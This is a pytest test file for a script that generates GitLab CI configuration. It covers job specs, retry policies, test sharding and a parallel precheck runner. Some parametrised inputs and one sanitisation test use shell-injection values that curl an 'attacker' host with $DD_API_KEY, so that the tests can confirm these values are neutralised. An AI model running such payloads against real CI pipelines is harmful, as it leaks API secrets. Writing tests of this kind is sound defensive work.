"""Tests for scripts/gen_gitlab_config.py."""

import importlib.util
import io
import json
import pathlib
import shlex
import subprocess
import sys
import types
from unittest import mock

import pytest
import yaml


_SCRIPT_PATH = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "gen_gitlab_config.py"


@pytest.fixture(scope="module")
def gen_gitlab_config_mod():
    # The script parses argv and imports the generator-only ruamel dependency at import time.
    ruamel = types.ModuleType("ruamel")
    yaml = types.ModuleType("ruamel.yaml")
    yaml.YAML = object
    ruamel.yaml = yaml

    spec = importlib.util.spec_from_file_location("gen_gitlab_config", _SCRIPT_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    original_path = list(sys.path)
    with mock.patch.dict(sys.modules, {"ruamel": ruamel, "ruamel.yaml": yaml, spec.name: module}):
        with mock.patch.object(sys, "argv", [str(_SCRIPT_PATH)]):
            spec.loader.exec_module(module)
        try:
            yield module
        finally:
            sys.path[:] = original_path


@pytest.mark.parametrize(
    "value, expected",
    [
        (None, "false"),
        ("", "false"),
        ("false", "false"),
        ("true", "true"),
        ("TRUE", "true"),
        (" true", "false"),
        ("$(curl attacker/$DD_API_KEY)", "false"),
        ('true" && curl attacker/$DD_API_KEY #', "false"),
    ],
)
def test_get_bool_env_only_allows_literal_true(gen_gitlab_config_mod, monkeypatch, value, expected):
    monkeypatch.delenv("NIGHTLY_BUILD", raising=False)
    if value is not None:
        monkeypatch.setenv("NIGHTLY_BUILD", value)

    assert gen_gitlab_config_mod._get_bool_env("NIGHTLY_BUILD") == expected


def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, monkeypatch):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")

    config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))

    assert '    - export NIGHTLY_BUILD="false"' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


@pytest.mark.parametrize(
    "config, message",
    [
        ({"parallelism": 2}, "must use venvs_per_job"),
        ({"ddtest": True, "venvs_per_job": 2}, "shard with ddtest_nodes"),
    ],
)
def test_gen_tests_rejects_unsupported_sharding_controls(gen_gitlab_config_mod, config, message):
    with pytest.raises(ValueError, match=message):
        gen_gitlab_config_mod._gen_tests({"suite": {"type": "test", **config}}, ["suite"])


def test_parallelism_defaults_to_one_job(gen_gitlab_config_mod):
    assert gen_gitlab_config_mod.calculate_parallelism_from_venvs(12) == 1


def test_ddtest_requires_a_test_path_for_every_venv(gen_gitlab_config_mod):
    info = gen_gitlab_config_mod.SuiteVenvInfo(
        environment_hashes=("hash-with-path", "hash-without-path"),
        environments=(("hash-with-path", "3.12"), ("hash-without-path", "3.12")),
        ddtest_metadata={
            "hash-with-path": ("first.txt", "tests/internal", "pytest tests/internal", ""),
            "hash-without-path": ("second.txt", "", "pytest tests/internal", ""),
        },
    )

    with pytest.raises(ValueError, match="hash-without-path"):
        gen_gitlab_config_mod._ddtest_module().validate_ddtest_venv_test_locations(
            "internal",
            info.environments,
            {environment_hash: metadata[1] for environment_hash, metadata in info.ddtest_metadata.items()},
        )


@pytest.mark.parametrize("retry_policy", [None, ".retry_on_infrastructure_or_service_failure"])
def test_ddtest_jobs_preserve_the_suite_command(gen_gitlab_config_mod, retry_policy):
    output = io.StringIO()
    ddtest_jobs = gen_gitlab_config_mod._ddtest_module()
    metadata = {
        "env123": (
            "tests/requirements_locks/env123.txt",
            "tests/tracer/**/test*.py",
            "pytest -v --ignore=tests/tracer/test_uwsgi_shutdown.py tests/tracer/",
            "PYTHONOPTIMIZE=1",
        )
    }

    ddtest_jobs.emit_ddtest_jobs(
        output,
        suite="tracer",
        stage="core",
        clean_name="tracer",
        config={"env": {}, "retry_policy": retry_policy},
        environments=[("env123", "3.12")],
        k=1,
        metadata=metadata,
        wait_lockfile="tests/requirements_locks/wait.txt",
    )

    content = output.getvalue()
    for base in (".ddtest_plan", ".ddtest_run"):
        extends = f"[{base}, {retry_policy}]" if retry_policy else base
        assert f"extends: {extends}" in content
    assert "DDTEST_COMMAND_env123: pytest -v --ignore=tests/tracer/test_uwsgi_shutdown.py tests/tracer/" in content
    assert "DDTEST_ENV_env123: PYTHONOPTIMIZE=1" in content


@pytest.mark.parametrize("main", [False, True])
def test_azure_suites_retry_infrastructure_or_service_failures(gen_gitlab_config_mod, main):
    root = _SCRIPT_PATH.parents[1]
    policies = yaml.safe_load((root / ".gitlab/retry-policies.yml").read_text())
    if main:
        policies.update(yaml.safe_load((root / ".gitlab/retry-policies-main.yml").read_text()))
    assert "exit_codes" not in policies[".retry_on_infrastructure_failure"]["retry"]

    suites = yaml.safe_load((root / "tests/contrib/suitespec.yml").read_text())["suites"]
    azure_suites = {name: config for name, config in suites.items() if name.startswith("azure_")}
    assert len(azure_suites) == 8
    for name, suite in azure_suites.items():
        suite.pop("matrix")
        with mock.patch.object(gen_gitlab_config_mod, "_wait_lockfile", return_value="wait.txt"):
            config = str(gen_gitlab_config_mod.JobSpec(name=name, stage="contrib", **suite))
        assert "  extends: [.test_base_snapshot, .retry_on_infrastructure_or_service_failure]" in config
        assert "  retry:" not in config
        policy = policies[suite["retry_policy"]]
        assert policy["extends"] == ".retry_on_infrastructure_failure"
        assert policy["variables"]["FF_USE_NEW_BASH_EVAL_STRATEGY"] == "true"
        retry = {**policies[policy["extends"]]["retry"], **policy["retry"]}
        assert retry == {
            **policies[".retry_on_infrastructure_failure"]["retry"],
            "max": 2,
            "exit_codes": [75],
        }
        assert "script_failure" not in retry["when"]


@pytest.mark.parametrize("use_policy, expected_status", [(False, 1), (True, 75)])
def test_service_retry_policy_preserves_bash_exit_status(use_policy, expected_status):
    root = _SCRIPT_PATH.parents[1]
    policies = yaml.safe_load((root / ".gitlab/retry-policies.yml").read_text())
    variables = policies[".retry_on_infrastructure_or_service_failure"].get("variables", {}) if use_policy else {}
    command = shlex.join([sys.executable, "-c", "raise SystemExit(75)"])
    evaluation = f"eval {shlex.quote(command)}"
    # GitLab Runner's new strategy evaluates the command in an explicit subshell.
    if variables.get("FF_USE_NEW_BASH_EVAL_STRATEGY") == "true":
        evaluation = f"({evaluation})"
    script = f"set -eo pipefail\n: | {evaluation}\nexit 0\n"

    result = subprocess.run(["bash", "-c", script], capture_output=True, text=True)

    assert result.returncode == expected_status, result.stderr


def test_ddtest_jobs_preserve_environment_values_with_spaces(gen_gitlab_config_mod):
    payload = gen_gitlab_config_mod._shell_environment(
        {
            "DDTEST_PYTEST_ADDOPTS": "-vv --ignore-glob='*civisibility*'",
            "DDTEST_SUITE_PATH": "tests/integration",
        }
    )
    result = subprocess.run(
        [
            "bash",
            "-c",
            'env_var=DDTEST_ENV; eval "export ${!env_var}"; printf "%s" "$DDTEST_PYTEST_ADDOPTS"',
        ],
        check=True,
        capture_output=True,
        env={"DDTEST_ENV": payload},
        text=True,
    )

    assert result.stdout == "-vv --ignore-glob='*civisibility*'"
    assert (gen_gitlab_config_mod.GITLAB / "tests.yml").read_text().count('eval "export ${!env_var}"') == 2


def test_jobs_use_declared_environments(gen_gitlab_config_mod):
    environment_hashes = ("first", "second", "third")
    config = str(
        gen_gitlab_config_mod.JobSpec(
            name="tracer",
            stage="core",
            suite="tracer",
            parallelism=2,
            environment_hashes=environment_hashes,
        )
    )

    assert "  extends: .test_base" in config
    assert "    - job: extract_test_artifacts" in config
    assert "    TEST_SUITE: tracer" in config
    configured_hashes = {
        environment_hash
        for line in config.splitlines()
        if line.strip().startswith("TEST_ENVIRONMENTS_")
        for environment_hash in line.rsplit('"', 2)[1].split()
    }
    assert configured_hashes == set(environment_hashes)


def test_unpinned_jobs_allow_prerelease_dependencies(gen_gitlab_config_mod, monkeypatch):
    monkeypatch.setenv("UNPIN_DEPENDENCIES", "true")

    config = str(gen_gitlab_config_mod.JobSpec(name="tracer", stage="core", suite="tracer"))

    assert "    UV_PRERELEASE: allow" in config


def test_snapshot_job_uses_defined_base(gen_gitlab_config_mod):
    with mock.patch.object(gen_gitlab_config_mod, "_wait_lockfile", return_value="tests/requirements_locks/wait.txt"):
        config = str(
            gen_gitlab_config_mod.JobSpec(name="requests", stage="contrib", suite="contrib::requests", snapshot=True)
        )
    extends = next(line.removeprefix("  extends: ") for line in config.splitlines() if line.startswith("  extends: "))
    test_templates = (gen_gitlab_config_mod.GITLAB / "tests.yml").read_text()

    assert extends == ".test_base_snapshot"
    assert f"{extends}:" in test_templates


def _wait_command(gen_gitlab_config_mod, services, snapshot=True):
    with mock.patch.object(gen_gitlab_config_mod, "_wait_lockfile", return_value="tests/requirements_locks/wait.txt"):
        config = str(
            gen_gitlab_config_mod.JobSpec(
                name="example", stage="contrib", suite="contrib::example", snapshot=snapshot, services=services
            )
        )
    return next(line for line in config.splitlines() if "tests/wait-for-services.py" in line)


@pytest.mark.parametrize("services", [[], ["elasticsearch", "httpbin"], ["memcached", "kafka"]])
def test_http_only_services_wait_without_a_client_environment(gen_gitlab_config_mod, services):
    command = _wait_command(gen_gitlab_config_mod, services)

    assert "uv run" not in command
    assert command.endswith(f"python tests/wait-for-services.py {' '.join([*services, 'testagent'])}")
    assert 'DD_TRACE_AGENT_URL="http://testagent:9126" AGENT_VERSION="testagent" ' in command


@pytest.mark.parametrize("services", [["postgres"], ["memcached", "redis"], ["azurite", "azureeventhubsemulator"]])
def test_client_library_services_wait_in_the_client_environment(gen_gitlab_config_mod, services):
    command = _wait_command(gen_gitlab_config_mod, services, snapshot=False)

    assert (
        "uv run --no-project --python 3.9 --no-python-downloads "
        "--with-requirements tests/requirements_locks/wait.txt --no-progress "
        f"python tests/wait-for-services.py {' '.join(services)}"
    ) in command


def test_prechecks_job_runs_checks_in_parallel(gen_gitlab_config_mod, monkeypatch, tmp_path):
    """The prechecks job must feed every selected check to the parallel runner."""
    # Stub needs_testrun: its real module needs uv-script dependencies (lxml,
    # vcrpy, ...) that are not installed in the test environment.
    fake_needs_testrun = types.ModuleType("needs_testrun")
    fake_needs_testrun.pr_matches_patterns = lambda patterns: True
    monkeypatch.setitem(sys.modules, "needs_testrun", fake_needs_testrun)

    tests_gen = tmp_path / "tests-gen.yml"
    monkeypatch.setattr(gen_gitlab_config_mod, "TESTS_GEN", tests_gen)

    gen_gitlab_config_mod.gen_pre_checks()

    out = tests_gen.read_text()
    assert "scripts/lint prepare" in out
    assert "scripts/run-parallel-prechecks.py - <<'EOF'" in out
    for name, command in (
        ("Style", "scripts/lint style"),
        ("Typing", "scripts/lint typing"),
        ("Spelling", "scripts/lint spelling"),
        ("Security", "scripts/lint security"),
    ):
        expected = json.dumps({"name": name, "command": command})
        assert f"      {expected}\n" in out
    # Checks must not be emitted as sequential script steps anymore.
    assert "section_0" not in out


def test_run_parallel_prechecks_reports_each_result(tmp_path):
    script = _SCRIPT_PATH.parents[1] / "scripts" / "run-parallel-prechecks.py"
    checks = tmp_path / "checks.jsonl"
    checks.write_text(
        json.dumps({"name": "Passing", "command": "echo ok"})
        + "\n"
        + json.dumps({"name": "Failing", "command": "echo oops >&2; exit 3"})
        + "\n"
    )

    proc = subprocess.run([sys.executable, str(script), str(checks)], capture_output=True, text=True, timeout=60)

    assert proc.returncode == 1
    assert "Passing: PASS" in proc.stdout
    assert "Failing: FAIL" in proc.stdout
    assert "oops" in proc.stdout
    assert proc.stdout.index("Passing: PASS") < proc.stdout.index("Failing: FAIL")
    # Both checks must appear in the summary table.
    assert "  FAIL" in proc.stdout


@pytest.mark.parametrize(
    "line",
    [
        "not json",
        '"just a string"',
        '{"name": "Missing command"}',
        '{"name": "", "command": "true"}',
        '{"name": "Extra key", "command": "true", "timeout": 60}',
    ],
)
def test_run_parallel_prechecks_rejects_malformed_lines(tmp_path, line):
    script = _SCRIPT_PATH.parents[1] / "scripts" / "run-parallel-prechecks.py"
    checks = tmp_path / "checks.jsonl"
    checks.write_text(line + "\n")

    proc = subprocess.run([sys.executable, str(script), str(checks)], capture_output=True, text=True, timeout=60)

    assert proc.returncode == 2
    assert "malformed check line" in proc.stderr


def test_run_parallel_prechecks_runs_checks_concurrently(tmp_path):
    """Two checks that wait for each other's sentinel file can only pass in parallel."""
    script = _SCRIPT_PATH.parents[1] / "scripts" / "run-parallel-prechecks.py"
    wait_for = 'touch "{d}/{name}"; for _ in $(seq 50); do [ -e "{d}/{other}" ] && exit 0; sleep 0.1; done; exit 1'
    checks = tmp_path / "checks.jsonl"
    checks.write_text(
        json.dumps({"name": "First", "command": wait_for.format(d=tmp_path, name="a", other="b")})
        + "\n"
        + json.dumps({"name": "Second", "command": wait_for.format(d=tmp_path, name="b", other="a")})
        + "\n"
    )

    proc = subprocess.run([sys.executable, str(script), str(checks)], capture_output=True, text=True, timeout=60)

    assert proc.returncode == 0
    assert "First: PASS" in proc.stdout
    assert "Second: PASS" in proc.stdout
